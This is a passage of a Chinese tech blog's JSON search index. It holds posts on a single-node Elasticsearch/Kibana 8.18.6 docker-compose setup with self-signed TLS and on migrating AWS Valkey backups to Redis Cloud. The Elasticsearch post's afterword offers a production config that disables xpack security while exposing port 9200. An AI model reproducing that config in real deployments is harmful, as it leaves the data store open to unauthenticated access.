class=\"s2\"\u003e\u0026#34;ccc\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;secretKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;ddd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;actions\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Read:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Write:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;List:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Tagging:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Admin:goods\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下，上面定义了一个admin用户，可以对所有s3进行读写和管理。\u003c/p\u003e","title":"seaweed S3服务单机版正式环境的部署"},{"content":"要在生产环境建一套Elasticsearch 8.0，单节点搭配Kibana，确实是困难重重，新版本需要TLS验证了\n现在这个时间节点，2025年9月2日，Elasticsearch最新版本是9.0，后撤2个版本是8.18.6\n那就用这个版本了，然后根据官方的文档会把人搞糊涂的。\n正确的方法如下：\n一、建立自签的证书 其实可以用ACME的证书，但是没有人会三个月就去重启一下ES的容器，更新证书吧！\n那只能选择自建CA，自签一个证书了！\n因为有2个pod，es和kibana，所以要签两张证书，签证书随便用ES的一个版本就可以：\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.1-linux-x86_64.tar.gz tar -zxf elasticsearch-8.4.1-linux-x86_64.tar.gz cd elasticsearch-8.4.1/ ./bin/elasticsearch-certutil ca --pem # 得到CA证书，放在当前目录ca目录下 unzip elastic-stack-ca.zip # 生成签发配置文件 cat \u0026lt;\u0026lt; EOF \u0026gt;instances.yml instances: - name: es01 dns: - es01 - localhost ip: - 127.0.0.1 - name: kibana dns: - kibana - localhost ip: - 127.0.0.1 EOF # 签发2个pod的证书 ./bin/elasticsearch-certutil cert --ca-cert ca/ca.crt --ca-key ca/ca.key --pem --in instances.yml # 得到2张证书和key unzip certificate-bundle.zip # 生成两个目录，es01和kibana # 准备好证书目录 mkdir -p /data/elasticsearch/certs mv ca es01 kibana /data/elasticsearch/certs # 准备好持久化卷 mkdir -p /data/elasticsearch/kibanadata mkdir -p /data/elasticsearch/esdata01 二、配置docker-compose.yaml 8.18.6版本的docker-compose.yaml文件，位于：/data/elasticsearch/docker-compose.yaml\n# docker-compose.yaml services: es01: container_name: es # The Docker image to use for this service image: docker.elastic.co/elasticsearch/elasticsearch:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/elasticsearch/config/certs - ./esdata01:/usr/share/elasticsearch/data # The ports to expose from this service ports: - 9200:9200 # The environment variables to set inside the container environment: - node.name=es01 - cluster.name=lancode-cluster - discovery.type=single-node - ELASTIC_PASSWORD=aaaaaaaaaaaa - bootstrap.memory_lock=true - \u0026#34;ES_JAVA_OPTS=-Xms10g -Xmx10g\u0026#34; - xpack.security.enabled=true - xpack.security.http.ssl.enabled=true - xpack.security.http.ssl.key=certs/es01/es01.key - xpack.security.http.ssl.certificate=certs/es01/es01.crt - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt - xpack.security.http.ssl.verification_mode=certificate - xpack.security.transport.ssl.enabled=true - xpack.security.transport.ssl.key=certs/es01/es01.key - xpack.security.transport.ssl.certificate=certs/es01/es01.crt - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt - xpack.security.transport.ssl.verification_mode=certificate - xpack.license.self_generated.type=basic # The memory limit for this service 12g = 1024*1024*1024*12 mem_limit: 12884901888 # The ulimits to set for this service ulimits: memlock: soft: -1 hard: -1 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q \u0026#39;missing authentication credentials\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 # The kibana service represents a Kibana instance kibana: # This service depends on the es01 service depends_on: es01: condition: service_healthy container_name: kibana # The Docker image to use for this service image: docker.elastic.co/kibana/kibana:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/kibana/config/certs - ./kibanadata:/usr/share/kibana/data # The ports to expose from this service ports: - 5601:5601 # The environment variables to set inside the container environment: - SERVERNAME=kibana - ELASTICSEARCH_HOSTS=https://es01:9200 - ELASTICSEARCH_USERNAME=kibana_system - ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbbb - ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt - xpack.security.audit.enabled=true - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=cccccccccccccccccccccc # The memory limit for this service 2g = 1024*1024*1024*2 mem_limit: 2147483648 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s -I http://localhost:5601 | grep -q \u0026#39;HTTP/1.1 302 Found\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 注意上面的计算：\n内存，系统是16G，2G保留，2G给kibana，12G给es，java启动参数给10g ELASTIC_PASSWORD=aaaaaaaaaaaa 这里的pass是指ES的独立用户elastic ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbb 这里的pass是指需要单独给kibana开的一个es用户kibana_system 最后登录kibana的密码是elastic用户的密码aaaaaaaaa\n这里差点被绕糊涂了，ES升级后需要启用https，然后也多加了用户。kibana需要单独用一个用户kibana_system去连接es，而es呢，也有一个独立的用户elastic进行管理。登录kibanna呢，实际是要用elastic这个用户登录。Faint！！！\n三、启动 docker compose up -d # 启动后必然报错，因为里面只有elastic这个用户，没有kibana_system用户 # 进入容器 docker exec -it es /bin/bash # 生成密码 curl -X POST --cacert config/certs/ca/ca.crt -u \u0026#34;elastic:aaaaaaaa\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; https://es01:9200/_security/user/kibana_system/_password -d \u0026#39;{\u0026#34;password\u0026#34;: \u0026#34;bbbbbbbb\u0026#34;}\u0026#39; # 或者这样也行 docker-compose exec -T es bin/elasticsearch-reset-password --batch --user kibana_system Password for the [kibana_system] user successfully reset. New value: bbbbbbbb 然后就ok了，登录的时候用elastic的密码，不要用kibana_system！\n四、题外 最鬼畜的地方就是kibana\n里面设置的两个配置项ELASTICSEARCH_USERNAME和ELASTICSEARCH_PASSWORD还有ELASTICSEARCH_HOSTS, 居然是环境变量\n进入容器里看到的kibana.yaml，倒数第二行elasticsearch.hosts 根本就是错的，误导群众，这里是环境变量优先，根本没有用到kibana.yaml中的配置！！！一定要注意。\n五、后记 无语啊无语，弄了自签证书，结果同事反映连接报证书错误\n算了，给个不要证书的配置docker-compose.yaml\nservices: es01: container_name: es # The Docker image to use for this service image: docker.elastic.co/elasticsearch/elasticsearch:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/elasticsearch/config/certs - ./esdata01:/usr/share/elasticsearch/data # The ports to expose from this service ports: - 9200:9200 # The environment variables to set inside the container environment: - node.name=es01 - cluster.name=lancode-cluster - discovery.type=single-node - ELASTIC_PASSWORD=aaaaaaaaaaaa - bootstrap.memory_lock=true - \u0026#34;ES_JAVA_OPTS=-Xms10g -Xmx10g\u0026#34; - xpack.security.enabled=false - xpack.license.self_generated.type=basic # The memory limit for this service 12g = 1024*1024*1024*12 mem_limit: 12884901888 # The ulimits to set for this service ulimits: memlock: soft: -1 hard: -1 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s -I http://localhost:9200 | grep -q \u0026#39;HTTP/1.1 200 OK\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 # The kibana service represents a Kibana instance kibana: # This service depends on the es01 service depends_on: es01: condition: service_healthy container_name: kibana # The Docker image to use for this service image: docker.elastic.co/kibana/kibana:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/kibana/config/certs - ./kibanadata:/usr/share/kibana/data # The ports to expose from this service ports: - 5601:5601 # The environment variables to set inside the container environment: - SERVERNAME=kibana - ELASTICSEARCH_HOSTS=http://es01:9200 - ELASTICSEARCH_USERNAME=kibana_system - ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbbb - xpack.security.enabled=false - xpack.security.audit.enabled=true - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=cccccccccccccccccccccc # The memory limit for this service 2g = 1024*1024*1024*2 mem_limit: 2147483648 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s -I http://localhost:5601 | grep -q \u0026#39;HTTP/1.1 302 Found\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 区别在于 xpack.security.enabled=false和healthcheck\n","permalink":"https://rendoumi.com/posts/20250902-elasticsearch_single_node_8_setup/","summary":"\u003cp\u003e要在生产环境建一套Elasticsearch 8.0，单节点搭配Kibana，确实是困难重重，新版本需要TLS验证了\u003c/p\u003e\n\u003cp\u003e现在这个时间节点，2025年9月2日，Elasticsearch最新版本是9.0，后撤2个版本是8.18.6\u003c/p\u003e\n\u003cp\u003e那就用这个版本了，然后根据官方的文档会把人搞糊涂的。\u003c/p\u003e\n\u003cp\u003e正确的方法如下：\u003c/p\u003e\n\u003ch5 id=\"一建立自签的证书\"\u003e一、建立自签的证书\u003c/h5\u003e\n\u003cp\u003e其实可以用ACME的证书，但是没有人会三个月就去重启一下ES的容器，更新证书吧！\u003c/p\u003e\n\u003cp\u003e那只能选择自建CA，自签一个证书了！\u003c/p\u003e\n\u003cp\u003e因为有2个pod，es和kibana，所以要签两张证书，签证书随便用ES的一个版本就可以：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.1-linux-x86_64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -zxf elasticsearch-8.4.1-linux-x86_64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e elasticsearch-8.4.1/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./bin/elasticsearch-certutil ca --pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 得到CA证书，放在当前目录ca目录下\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip elastic-stack-ca.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 生成签发配置文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;instances.yml \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003einstances:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e   - name: es01\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     dns:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - es01\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - localhost\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     ip:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - 127.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e   - name: kibana\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     dns:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - kibana\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - localhost\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     ip:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - 127.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 签发2个pod的证书\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./bin/elasticsearch-certutil cert --ca-cert ca/ca.crt --ca-key ca/ca.key --pem --in instances.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 得到2张证书和key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip certificate-bundle.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 生成两个目录，es01和kibana\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 准备好证书目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/elasticsearch/certs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv ca es01 kibana /data/elasticsearch/certs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 准备好持久化卷\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/elasticsearch/kibanadata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/elasticsearch/esdata01\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二配置docker-composeyaml\"\u003e二、配置docker-compose.yaml\u003c/h5\u003e\n\u003cp\u003e8.18.6版本的docker-compose.yaml文件，位于：/data/elasticsearch/docker-compose.yaml\u003c/p\u003e","title":"生产环境Elasticsearch 8单节点Docker-compose的安装方法"},{"content":"这还真是个大活，耗费了整整一天的时间。\n究其原因根本就是无论AWS托管的Valkey还是社区的Redis.io，都是被魔改过的阉割版，真是无语他妈给无语开门，无语到家了！\n说一下详细的过程：\n接到这个任务，首先想到的是同步软件redis-Gunyu\nhttps://github.com/mgtv-tech/redis-GunYu\n结果是失败，原因很奇葩，因为aws valkey是必须带tls连接的，Gunyu不支持，放弃。\n然后找到了redis-shake\nhttps://tair-opensource.github.io/RedisShake\n结果还是失败，理由是不支持PSync，用了scan_reader也失败\n然后就又想到了万能的ChatGPT和Google的Gemini，分别给了2个python程序，也是失败\n原因是不支持Migrate命令，而且valkey是基于redis 7.2改的，而Redis.io是8.0，命令不兼容\n走投无路之下想到了rdb-tools，先把valkey做个备份，放到S3桶里\nvaleky-20250819-0001.rdb valeky-20250819-0002.rdb valeky-20250819-0003.rdb valeky-20250819-0004.rdb valeky-20250819-0005.rdb valeky-20250819-config.json cat valeky-20250819-config.json { \u0026#34;valeky-20250819/valeky-20250819-0002.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;0-5496\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;5234516\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0004.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;5497-8375\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;4340658\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0003.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;10082-16383\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;5962581\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0001.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;8376\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;2218\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0005.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;8377-10081\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;1540505\u0026#34; } } 看起来是5个rdb备份，每个文件对应redis不同的slots\n用rdb来解析备份文件，结果失败，因为不认识valkey rdb的版本。\n没办法了，又找到了这个软件\nhttps://github.com/HDT3213/rdb\n下载后，首先想处理成json文件，然后灌入到redis.io\n./rdb-linux-amd64 -c json -o 0001.json valeky-20250819-0001.rdb 失败，因为json文件灌入的时候redis.io又被阉割了，命令不支持\n走投无路，走投无路，走投无路啊！！！欲哭无泪，欲哭无泪，欲哭无泪啊！！！\n没办法了，用redis-shake把rdb文件逐个灌进去\n[rdb_reader] filepath = \u0026#34;/root/redis/rdbs/valeky-20250819-0001.rdb\u0026#34; [redis_writer] cluster = false address = \u0026#34;redis-22222.c1.ap-southeast-1-1.ec2.redns.redis-cloud.com:22222\u0026#34; username = \u0026#34;default\u0026#34; password = \u0026#34;ABCDEFG\u0026#34; tls = false 执行了5次，就可以了。\n后续啊：可以先去下个rdt\nhttps://github.com/leonchen83/redis-rdb-cli/\n把5个rdb合成一个，然后再灌入。\n./rdt -m ../../valeky-20250819-0001.rdb ../../valeky-20250819-0002.rdb ../../valeky-20250819-0003.rdb ../../valeky-20250819-0004.rdb ../../valeky-20250819-0005.rdb -o all.rdb 真的是累死了。\n","permalink":"https://rendoumi.com/posts/20250820-aws_valkey_to_redis_io/","summary":"\u003cp\u003e这还真是个大活，耗费了整整一天的时间。\u003c/p\u003e\n\u003cp\u003e究其原因根本就是无论AWS托管的Valkey还是社区的Redis.io，都是被魔改过的阉割版，真是无语他妈给无语开门，无语到家了！\u003c/p\u003e\n\u003cp\u003e说一下详细的过程：\u003c/p\u003e\n\u003cp\u003e接到这个任务，首先想到的是同步软件redis-Gunyu\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/mgtv-tech/redis-GunYu\"\u003ehttps://github.com/mgtv-tech/redis-GunYu\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e结果是失败，原因很奇葩，因为aws valkey是必须带tls连接的，Gunyu不支持，放弃。\u003c/p\u003e\n\u003cp\u003e然后找到了redis-shake\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tair-opensource.github.io/RedisShake\"\u003ehttps://tair-opensource.github.io/RedisShake\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e结果还是失败，理由是不支持PSync，用了scan_reader也失败\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250820141906654\" loading=\"lazy\" src=\"/posts/20250820-aws_valkey_to_redis_io/image-20250820141906654.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就又想到了万能的ChatGPT和Google的Gemini，分别给了2个python程序，也是失败\u003c/p\u003e\n\u003cp\u003e原因是不支持Migrate命令，而且valkey是基于redis 7.2改的，而Redis.io是8.0，命令不兼容\u003c/p\u003e\n\u003cp\u003e走投无路之下想到了rdb-tools，先把valkey做个备份，放到S3桶里\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0001.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0002.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0003.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0004.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0005.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-config.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat valeky-20250819-config.json \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0002.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;0-5496\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;5234516\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0004.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;5497-8375\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;4340658\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0003.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;10082-16383\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;5962581\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0001.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;8376\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;2218\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan 